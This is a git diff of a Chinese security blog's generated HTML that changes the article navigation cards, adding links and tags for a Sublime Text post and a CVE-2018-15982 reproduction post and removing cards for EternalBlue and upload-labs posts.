                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-07
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-31
                         </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/tools/" class="post-category" target="_blank">
+                                    tools
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Sublime-Text3/" target="_blank">
+                        <span class="chip bg-color">Sublime Text3</span>
+                    </a>
+                    
+                    <a href="/tags/透明美化/" target="_blank">
+                        <span class="chip bg-color">透明美化</span>
+                    </a>
+                    
+                    <a href="/tags/python/" target="_blank">
+                        <span class="chip bg-color">python</span>
+                    </a>
+                    
+                    <a href="/tags/插件/" target="_blank">
+                        <span class="chip bg-color">插件</span>
+                    </a>
+                    
+                    <a href="/tags/vim/" target="_blank">
+                        <span class="chip bg-color">vim</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/08/08/cve-2018-15982-ren-yi-dai-ma-zhi-xing-lou-dong-fu-xian/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="CVE-2018-15982任意代码执行漏洞复现">
+                        
+                        <span class="card-title">CVE-2018-15982任意代码执行漏洞复现</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            0x01 漏洞概述2018年11月29日，360高级威胁应对团队在全球范围内第一时间发现一起针对俄罗斯的APT攻击行动，通过一份俄文内容的医院员工问卷文档，携带最新的Flash 0day漏洞和具有自毁功能的专属木马程序，该漏洞（CVE-20
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-08
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -1032,75 +1195,12 @@ print r.text</code></pre><p>(记得修改python文件里面的ip地址)<br>直�
                         <span class="chip bg-color">复现</span>
                     </a>
                     
-                    <a href="/tags/永恒之蓝漏洞/" target="_blank">
-                        <span class="chip bg-color">永恒之蓝漏洞</span>
+                    <a href="/tags/CVE-2018-15982/" target="_blank">
+                        <span class="chip bg-color">CVE-2018-15982</span>
                     </a>
                     
-                    <a href="/tags/ms17-010/" target="_blank">
-                        <span class="chip bg-color">ms17-010</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="upload-labs文件上传漏洞练习">
-                        
-                        <span class="card-title">upload-labs文件上传漏洞练习</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            0x01 前言最近在研究文件上传漏洞，找到一个很好的靶场——upload-labs，一个想帮你总结所有类型的上传漏洞的靶场 ，可以用docker快速搭建，闯关的过程中遇到很多问题，受益匪浅。
-
-0x02 环境搭建使用docker快速搭建，d
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-04
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Information-Security/" class="post-category" target="_blank">
-                                    Information Security
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/靶场/" target="_blank">
-                        <span class="chip bg-color">靶场</span>
-                    </a>
-                    
-                    <a href="/tags/dcoker/" target="_blank">
-                        <span class="chip bg-color">dcoker</span>
-                    </a>
-                    
-                    <a href="/tags/upload-labs/" target="_blank">
-                        <span class="chip bg-color">upload-labs</span>
-                    </a>
-                    
-                    <a href="/tags/文件上传/" target="_blank">
-                        <span class="chip bg-color">文件上传</span>
+                    <a href="/tags/任意代码执行/" target="_blank">
+                        <span class="chip bg-color">任意代码执行</span>
                     </a>
                     
                 </div>
